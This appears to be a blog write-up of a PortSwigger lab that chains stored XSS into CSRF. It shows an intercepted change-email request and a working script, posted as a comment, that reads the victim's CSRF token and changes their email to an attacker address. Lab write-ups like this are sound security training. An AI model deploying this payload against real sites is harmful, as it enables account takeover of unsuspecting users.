---
layout: post
title:  "Exploiting XSS to perform CSRF"
date:   2024-09-29 09:39:54 +0530
categories: [BSCP, XSS]
---

## Intro 

This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a [CSRF attack](https://portswigger.net/web-security/csrf) and change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: `wiener:peter`⁠

  

## Solution

As they mentioned that email change fnctionality is some interesting piece of vulnerability to check the lab 

  

![]({{ site.baseurl }}/assets/images/image.png)  

  

Change the email, Intercept the request in burpsuite and the request looks like this

  

```bash
POST /my-account/change-email HTTP/2
Host: 0a470088045c3a718c88df1b000300bd.web-security-academy.net
Cookie: session=LDVKjeWBrMHGqQ1zoptKz3E6qTFhr3m3
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: https://0a470088045c3a718c88df1b000300bd.web-security-academy.net
Dnt: 1
Referer: https://0a470088045c3a718c88df1b000300bd.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=1
Te: trailers

email=test%40gmail.com&csrf=O7i3U2JlBGsRYmmMOzdTDO0vBFGzImcQ
```

  

Now let’s remove the CSRF parameter along with the value and found that request won’t pass out 

  

  

![]({{ site.baseurl }}/assets/images/image%202.png)  

  

CSRF Parameter is properly being validated and the token is being pulled off from the `view-source`  page as a hidden parameter 

  

![]({{ site.baseurl }}/assets/images/image%203.png)  

  

Since the attribute name is `csrf`  and we can able to pull off csrf token with the following snippet `document.getElementsByName('csrf')[0].value`⁠

  

![]({{ site.baseurl }}/assets/images/image%204.png)  

  

And here is the full exploit and where we can plant inside some kind of blog post as comments and wait for sometime for the lab to solve 

  

```html
<script>
    window.addEventListener('DOMContentLoaded', function() {
    var token = document.getElementsByName('csrf')[0].value
    var data = new FormData();
    data.append('csrf', token);
    data.append('email', 'M4rdukwasH3re@EvilEmail.com');
    fetch('/my-account/change-email', {
        method: 'POST',
         mode: 'no-cors',
        body: data
    });
    });
</script>
```

  

Once after posting the comment, our lab is solved because the victim’s email changed

  

![]({{ site.baseurl }}/assets/images/image%205.png)